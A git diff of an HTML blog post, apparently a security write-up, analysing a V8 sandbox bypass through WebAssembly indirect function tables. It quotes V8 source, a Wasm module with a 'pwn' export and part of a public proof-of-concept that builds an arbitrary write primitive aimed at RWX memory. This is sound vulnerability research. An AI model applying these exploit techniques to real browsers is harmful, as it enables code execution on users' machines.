-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;elem&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f42&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$f83&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;
+  (import &amp;quot;js&amp;quot; &amp;quot;tbl&amp;quot; (table 2 funcref))
+  (func $f42 (result i32) i32.const 42)  ;; [1] Define $f42 function
+  (func $f83 (result i32) i32.const 83)  ;; [2] Define $f83 function
+  (elem (i32.const 0) $f42 $f83)
 
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;times2&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pwn&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$jstimes3&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+  (func (export &amp;quot;times2&amp;quot;) (type $int2int) (i32.const 16))
+  (func (export &amp;quot;pwn&amp;quot;) (type $int2int) (i32.const 16) (call $jstimes3))
+)&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Looking at points &lt;code&gt;[1]&lt;/code&gt; and &lt;code&gt;[2]&lt;/code&gt;, you can see the declarations for both functions.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Since a full breakdown of the Wasm code will be covered at the very end of this post, feel free to refer to that section if you&amp;#x2019;d like to dive deeper into it! &amp;#x1F64F;&amp;#x1F3FB;&lt;/p&gt;
@@ -185,12 +185,12 @@ DebugPrint: 0x194f001cce8d: [FixedArray]
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/* wasm/wasm-objects-inl.h */&lt;/span&gt;
 
 &lt;span class=&#34;hljs-comment&#34;&gt;// WasmIndirectFunctionTable&lt;/span&gt;
-&lt;span class=&#34;hljs-built_in&#34;&gt;TQ_OBJECT_CONSTRUCTORS_IMPL&lt;/span&gt;(WasmIndirectFunctionTable)
-&lt;span class=&#34;hljs-built_in&#34;&gt;PRIMITIVE_ACCESSORS&lt;/span&gt;(WasmIndirectFunctionTable, sig_ids, &lt;span class=&#34;hljs-type&#34;&gt;uint32_t&lt;/span&gt;*,
+TQ_OBJECT_CONSTRUCTORS_IMPL(WasmIndirectFunctionTable)
+PRIMITIVE_ACCESSORS(WasmIndirectFunctionTable, sig_ids, &lt;span class=&#34;hljs-keyword&#34;&gt;uint32_t&lt;/span&gt;*,
                     kSigIdsOffset)
-&lt;span class=&#34;hljs-built_in&#34;&gt;PRIMITIVE_ACCESSORS&lt;/span&gt;(WasmIndirectFunctionTable, targets, Address*,    &lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
+PRIMITIVE_ACCESSORS(WasmIndirectFunctionTable, targets, Address*,    &lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
                     kTargetsOffset)
-&lt;span class=&#34;hljs-built_in&#34;&gt;OPTIONAL_ACCESSORS&lt;/span&gt;(WasmIndirectFunctionTable, managed_native_allocations,
+OPTIONAL_ACCESSORS(WasmIndirectFunctionTable, managed_native_allocations,
                    Foreign, kManagedNativeAllocationsOffset)&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Checking the contents at &lt;code&gt;[1]&lt;/code&gt;, we can see that the &lt;code&gt;WasmIndirectFunctionTable&lt;/code&gt; object contains a &lt;code&gt;targets&lt;/code&gt; field. As illustrated in the previous diagram, this field holds the address information for &lt;code&gt;$f42&lt;/code&gt; and &lt;code&gt;$f83&lt;/code&gt;. Recall that in the first patch, the allocation method was changed from using &lt;code&gt;PRIMITIVE_ACCESSORS&lt;/code&gt; to &lt;code&gt;ACCESSORS&lt;/code&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;d8&amp;gt; %DebugPrintPtr(0x325b001ccea9);
@@ -220,33 +220,33 @@ DebugPrint: 0x325b001ccea9: [WasmIndirectFunctionTable]
 &lt;h4 id=&#34;3-1-3-Construct-Primitive&#34;&gt;&lt;a href=&#34;#3-1-3-Construct-Primitive&#34; class=&#34;headerlink&#34; title=&#34;3.1.3. Construct Primitive&#34;&gt;&lt;/a&gt;3.1.3. Construct Primitive&lt;/h4&gt;&lt;p&gt;Now that we understand what kind of values are stored in the &lt;code&gt;targets&lt;/code&gt; field, we need to look into how we can actually leverage them. To set a value in this specific field, the &lt;code&gt;WasmIndirectFunctionTable::Set()&lt;/code&gt; function is used, which is implemented as follows:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/* wasm/wasm-objects.cc */&lt;/span&gt;
 
-&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmIndirectFunctionTable::Set&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;uint32_t&lt;/span&gt; index, &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; sig_id,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                    Address call_target, Object ref)&lt;/span&gt; &lt;/span&gt;{
-  &lt;span class=&#34;hljs-built_in&#34;&gt;sig_ids&lt;/span&gt;()[index] = sig_id;
-  &lt;span class=&#34;hljs-built_in&#34;&gt;targets&lt;/span&gt;()[index] = call_target;
-  &lt;span class=&#34;hljs-built_in&#34;&gt;refs&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt;(index, ref);
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmIndirectFunctionTable::Set&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;uint32_t&lt;/span&gt; index, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; sig_id,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                    Address call_target, Object ref)&lt;/span&gt; &lt;/span&gt;{
+  sig_ids()[index] = sig_id;
+  targets()[index] = call_target;
+  refs().&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt;(index, ref);
 }&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Looking at the code, we can confirm that the &lt;code&gt;call_target&lt;/code&gt; value passed as an argument is written to the memory location pointed to by &lt;code&gt;targets&lt;/code&gt;. The core realization here was that if an attacker could manipulate this location, it would enable an arbitrary write primitive.&lt;/p&gt;
 &lt;p&gt;The next piece of information needed was to verify whether &lt;code&gt;call_target&lt;/code&gt; is a value the attacker can control, and if so, what address it should be directed to point to. First of all, the &lt;code&gt;WasmIndirectFunctionTable::Set()&lt;/code&gt; function is called inside &lt;code&gt;WasmTableObject::Set()&lt;/code&gt;, which can be triggered via the JavaScript API &lt;code&gt;WebAssembly.Table.prototype.set()&lt;/code&gt;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// https://github.com/theori-io/v8-sbx-bypass-wasm&lt;/span&gt;
 
-  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;arbitrary_write&lt;/span&gt; = (&lt;span class=&#34;hljs-params&#34;&gt;where, what&lt;/span&gt;) =&amp;gt; {
-    &lt;span class=&#34;hljs-title function_&#34;&gt;caged_write64&lt;/span&gt;(where_ptr, where - &lt;span class=&#34;hljs-number&#34;&gt;0x8n&lt;/span&gt;);
-    &lt;span class=&#34;hljs-title function_&#34;&gt;caged_write64&lt;/span&gt;(what_ptr, what);
-    tbl.&lt;span class=&#34;hljs-title function_&#34;&gt;set&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, times2);
-    &lt;span class=&#34;hljs-title function_&#34;&gt;caged_write64&lt;/span&gt;(what_ptr, rwx);
-    &lt;span class=&#34;hljs-title function_&#34;&gt;caged_write64&lt;/span&gt;(where_ptr, targets);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arbitrary_write = &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;where, what&lt;/span&gt;) =&amp;gt;&lt;/span&gt; {
+    caged_write64(where_ptr, where - &lt;span class=&#34;hljs-number&#34;&gt;0x8n&lt;/span&gt;);
+    caged_write64(what_ptr, what);
+    tbl.set(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, times2);
+    caged_write64(what_ptr, rwx);
+    caged_write64(where_ptr, targets);
   };
   
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;This corresponds to the &lt;code&gt;tbl.set()&lt;/code&gt; call in the publicly available PoC example. The &lt;code&gt;index&lt;/code&gt; passed as an argument was not an issue since it directly uses the value provided by the user. However, for &lt;code&gt;call_target&lt;/code&gt;, the caller utilizes the return value of &lt;code&gt;WasmInstanceObject::GetCallTarget()&lt;/code&gt;.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;Address &lt;span class=&#34;hljs-title&#34;&gt;WasmInstanceObject::GetCallTarget&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;uint32_t&lt;/span&gt; func_index)&lt;/span&gt; &lt;/span&gt;{
-  wasm::NativeModule* native_module = &lt;span class=&#34;hljs-built_in&#34;&gt;module_object&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;native_module&lt;/span&gt;();
-  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (func_index &amp;lt; native_module-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;num_imported_functions&lt;/span&gt;()) {
-    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;imported_function_targets&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(func_index);
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;Address &lt;span class=&#34;hljs-title&#34;&gt;WasmInstanceObject::GetCallTarget&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;uint32_t&lt;/span&gt; func_index)&lt;/span&gt; &lt;/span&gt;{
+  wasm::NativeModule* native_module = module_object().native_module();
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (func_index &amp;lt; native_module-&amp;gt;num_imported_functions()) {
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; imported_function_targets().get(func_index);
   }
-  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;jump_table_start&lt;/span&gt;() +
-         &lt;span class=&#34;hljs-built_in&#34;&gt;JumpTableOffset&lt;/span&gt;(native_module-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;(), func_index);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; jump_table_start() +
+         JumpTableOffset(native_module-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;(), func_index);
 }&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Since the return value of this function was determined by &lt;code&gt;func_index&lt;/code&gt;, it posed a significant constraint on specifying an arbitrary address. If &lt;code&gt;func_index&lt;/code&gt; falls within the range of imported functions, the value is returned from &lt;code&gt;imported_function_targets&lt;/code&gt;; otherwise, it returns an address calculated by adding an offset to &lt;code&gt;jump_table_start()&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;imported_function_targets&lt;/code&gt; is a field that holds the locations of functions passed from the outside during instance creation. Debugging the pointers it references internally confirms that they point directly to an RWX memory region.&lt;/p&gt;
@@ -268,23 +268,23 @@ Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// wasm/wasm-objects.cc&lt;/span&gt;
 
 &lt;span class=&#34;hljs-comment&#34;&gt;// TODO(manoskouk): Does this need to be handlified?&lt;/span&gt;
-&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::Set&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate, Handle&amp;lt;WasmTableObject&amp;gt; table,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                          &lt;span class=&#34;hljs-type&#34;&gt;uint32_t&lt;/span&gt; index, Handle&amp;lt;Object&amp;gt; entry)&lt;/span&gt; &lt;/span&gt;{
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::Set&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate, Handle&amp;lt;WasmTableObject&amp;gt; table,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                          &lt;span class=&#34;hljs-keyword&#34;&gt;uint32_t&lt;/span&gt; index, Handle&amp;lt;Object&amp;gt; entry)&lt;/span&gt; &lt;/span&gt;{
   &lt;span class=&#34;hljs-comment&#34;&gt;// Callers need to perform bounds checks, type check, and error handling.&lt;/span&gt;
-  &lt;span class=&#34;hljs-built_in&#34;&gt;DCHECK&lt;/span&gt;(&lt;span class=&#34;hljs-built_in&#34;&gt;IsInBounds&lt;/span&gt;(isolate, table, index));
+  DCHECK(IsInBounds(isolate, table, index));
 
   &lt;span class=&#34;hljs-function&#34;&gt;Handle&amp;lt;FixedArray&amp;gt; &lt;span class=&#34;hljs-title&#34;&gt;entries&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(table-&amp;gt;entries(), isolate)&lt;/span&gt;&lt;/span&gt;;
   &lt;span class=&#34;hljs-comment&#34;&gt;// The FixedArray is addressed with int&amp;apos;s.&lt;/span&gt;
-  &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; entry_index = &lt;span class=&#34;hljs-built_in&#34;&gt;static_cast&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt;&amp;gt;(index);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; entry_index = &lt;span class=&#34;hljs-keyword&#34;&gt;static_cast&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;&amp;gt;(index);
 
-  &lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt; (table-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;heap_representation&lt;/span&gt;()) {
+  &lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt; (table-&amp;gt;type().heap_representation()) {
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;
     &lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;:
-      &lt;span class=&#34;hljs-built_in&#34;&gt;DCHECK&lt;/span&gt;(!table-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;instance&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;IsUndefined&lt;/span&gt;());
-      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmInstanceObject::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(table-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;instance&lt;/span&gt;())
-              .&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;()
-              -&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;has_signature&lt;/span&gt;(table-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;type&lt;/span&gt;().&lt;span class=&#34;hljs-built_in&#34;&gt;ref_index&lt;/span&gt;())) {
-        &lt;span class=&#34;hljs-built_in&#34;&gt;SetFunctionTableentry&lt;/span&gt;(isolate, table, entries, entry_index, entry); &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;lt;== here&lt;/span&gt;
+      DCHECK(!table-&amp;gt;instance().IsUndefined());
+      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmInstanceObject::cast(table-&amp;gt;instance())
+              .&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;()
+              -&amp;gt;has_signature(table-&amp;gt;type().ref_index())) {
+        SetFunctionTableentry(isolate, table, entries, entry_index, entry); &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;lt;== here&lt;/span&gt;
         &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
       }
       entries-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt;(entry_index, *entry);
@@ -294,54 +294,54 @@ Modified memory (dirty) page list provided, 0 entries.&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Inside this function, a &lt;code&gt;switch-case&lt;/code&gt; statement is used to route the execution to different processing functions based on the table&amp;#x2019;s type. Since the target function we want to reach requires passing through &lt;code&gt;SetFunctionTableentry()&lt;/code&gt;, it is processed under the &lt;code&gt;default&lt;/code&gt; case, which does not match any of the predefined conditions.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// wasm/wasm-objects.cc&lt;/span&gt;
 
-&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::SetFunctionTableentry&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                            Handle&amp;lt;WasmTableObject&amp;gt; table,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                            Handle&amp;lt;FixedArray&amp;gt; entries,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                            &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; entry_index,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                            Handle&amp;lt;Object&amp;gt; entry)&lt;/span&gt; &lt;/span&gt;{
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::SetFunctionTableentry&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                            Handle&amp;lt;WasmTableObject&amp;gt; table,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                            Handle&amp;lt;FixedArray&amp;gt; entries,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                            &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; entry_index,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                            Handle&amp;lt;Object&amp;gt; entry)&lt;/span&gt; &lt;/span&gt;{
 &lt;span class=&#34;hljs-comment&#34;&gt;// ...&lt;/span&gt;
-  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmExportedFunction::&lt;span class=&#34;hljs-built_in&#34;&gt;IsWasmExportedFunction&lt;/span&gt;(*external)) {  &lt;span class=&#34;hljs-comment&#34;&gt;// Check is exported&lt;/span&gt;
-    &lt;span class=&#34;hljs-keyword&#34;&gt;auto&lt;/span&gt; exported_function = Handle&amp;lt;WasmExportedFunction&amp;gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(external);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmExportedFunction::IsWasmExportedFunction(*external)) {  &lt;span class=&#34;hljs-comment&#34;&gt;// Check is exported&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;auto&lt;/span&gt; exported_function = Handle&amp;lt;WasmExportedFunction&amp;gt;::cast(external);
     &lt;span class=&#34;hljs-function&#34;&gt;Handle&amp;lt;WasmInstanceObject&amp;gt; &lt;span class=&#34;hljs-title&#34;&gt;target_instance&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(exported_function-&amp;gt;instance(),&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                               isolate)&lt;/span&gt;&lt;/span&gt;;
-    &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; func_index = exported_function-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;function_index&lt;/span&gt;();
-    &lt;span class=&#34;hljs-keyword&#34;&gt;auto&lt;/span&gt;* wasm_function = &amp;amp;target_instance-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;()-&amp;gt;functions[func_index];
-    &lt;span class=&#34;hljs-built_in&#34;&gt;UpdateDispatchTables&lt;/span&gt;(isolate, *table, entry_index, wasm_function,
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;                                               isolate)&lt;/span&gt;&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; func_index = exported_function-&amp;gt;function_index();
+    &lt;span class=&#34;hljs-keyword&#34;&gt;auto&lt;/span&gt;* wasm_function = &amp;amp;target_instance-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;()-&amp;gt;functions[func_index];
+    UpdateDispatchTables(isolate, *table, entry_index, wasm_function,
                          *target_instance);
-  } &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmJSFunction::&lt;span class=&#34;hljs-built_in&#34;&gt;IsWasmJSFunction&lt;/span&gt;(*external)) {
-    &lt;span class=&#34;hljs-built_in&#34;&gt;UpdateDispatchTables&lt;/span&gt;(isolate, table, entry_index,
-                         Handle&amp;lt;WasmJSFunction&amp;gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(external));
+  } &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WasmJSFunction::IsWasmJSFunction(*external)) {
+    UpdateDispatchTables(isolate, table, entry_index,
+                         Handle&amp;lt;WasmJSFunction&amp;gt;::cast(external));
   } &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
-    &lt;span class=&#34;hljs-built_in&#34;&gt;DCHECK&lt;/span&gt;(WasmCapiFunction::&lt;span class=&#34;hljs-built_in&#34;&gt;IsWasmCapiFunction&lt;/span&gt;(*external));
-    &lt;span class=&#34;hljs-built_in&#34;&gt;UpdateDispatchTables&lt;/span&gt;(isolate, table, entry_index,
-                         Handle&amp;lt;WasmCapiFunction&amp;gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;cast&lt;/span&gt;(external));
+    DCHECK(WasmCapiFunction::IsWasmCapiFunction(*external));
+    UpdateDispatchTables(isolate, table, entry_index,
+                         Handle&amp;lt;WasmCapiFunction&amp;gt;::cast(external));
   }
   entries-&amp;gt;&lt;span class=&#34;hljs-built_in&#34;&gt;set&lt;/span&gt;(entry_index, *entry);
 }&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Inside the &lt;code&gt;WasmTableObject::SetFunctionTableentry()&lt;/code&gt; function, the behavior varies depending on the location of the target function. The vulnerable logic can be reached specifically when the function is &amp;#x2018;exported&amp;#x2019;. The other two cases, despite sharing the same function name, are handled by overloaded functions with different parameters, so careful attention is required.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// static&lt;/span&gt;
-&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::UpdateDispatchTables&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                           WasmTableObject table,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                           &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; entry_index,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                           &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; wasm::WasmFunction* func,&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;                                           WasmInstanceObject target_instance)&lt;/span&gt; &lt;/span&gt;{
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;WasmTableObject::UpdateDispatchTables&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Isolate* isolate,&lt;/span&gt;&lt;/span&gt;
